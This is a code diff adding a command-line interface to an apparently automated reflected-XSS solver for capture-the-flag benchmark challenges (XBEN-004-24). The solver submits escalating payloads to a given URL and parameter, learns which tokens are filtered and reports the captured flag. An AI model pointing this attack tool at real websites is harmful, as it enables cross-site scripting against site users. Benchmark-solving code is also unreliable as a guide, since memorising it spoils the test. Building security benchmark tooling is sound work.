@@ -171,3 +171,62 @@ def solve(
         # blocked (untokenised) / wrong_marker / retry: advance to next candidate.
     return SolveResult(False, attempts=tried, learned_blacklist=blacklist,
                        last_snippet=last[:400])
+
+
+# --- CLI: validate the solver live against a single endpoint ----------------
+# No agent stack, no API key, no LLM — just this module + httpx. Use it to
+# confirm the ladder against a live challenge:
+#     make -C /tmp/xben/benchmarks/XBEN-004-24 run          # stand it up
+#     PORT=$(docker compose -f /tmp/xben/benchmarks/XBEN-004-24/docker-compose.yml \
+#            ps --format '{{.Publishers}}' | grep -oE '[0-9]+->5000' | cut -d- -f1)
+#     python3 agent/xss_bot_solver.py --url http://localhost:$PORT/xss25 \
+#            --param solution --method POST
+
+def _cli(argv=None) -> int:
+    import argparse
+    import json as _json
+
+    p = argparse.ArgumentParser(
+        prog="xss_bot_solver",
+        description="Live-solve a checker/bot-backed reflected-XSS endpoint.",
+    )
+    p.add_argument("--url", required=True, help="Reflecting endpoint URL")
+    p.add_argument("--param", required=True, help="Parameter/form field name")
+    p.add_argument("--method", default="POST", choices=["GET", "POST"])
+    p.add_argument("--marker", default="XSS")
+    p.add_argument("--seed-blacklist", default="", help="Comma-separated known-blocked tokens")
+    p.add_argument("--success-regex", default="", help="Custom win regex (default flag{...})")
+    p.add_argument("--max-attempts", type=int, default=16)
+    a = p.parse_args(argv)
+
+    try:
+        import httpx
+    except ImportError:
+        print("this CLI needs httpx: pip install httpx")
+        return 1
+
+    def _send(m, url, param, payload):
+        try:
+            with httpx.Client(timeout=20, follow_redirects=True, verify=False) as c:
+                r = c.get(url, params={param: payload}) if m.upper() == "GET" \
+                    else c.post(url, data={param: payload})
+                return r.text
+        except Exception as exc:
+            return f"__send_error__: {exc}"
+
+    seeds = [t for t in a.seed_blacklist.split(",") if t.strip()]
+    rx = re.compile(a.success_regex) if a.success_regex else None
+    res = solve(_send, a.url, param=a.param, method=a.method, marker=a.marker,
+                seed_blacklist=seeds, success_regex=rx, max_attempts=a.max_attempts)
+    print(_json.dumps({
+        "solved": res.solved, "flag": res.flag, "technique": res.technique,
+        "payload": res.payload, "attempts": res.attempts,
+        "learned_blacklist": res.learned_blacklist,
+        "hint": None if res.solved else res.last_snippet,
+    }, indent=2))
+    return 0 if res.solved else 2
+
+
+if __name__ == "__main__":
+    import sys
+    sys.exit(_cli())
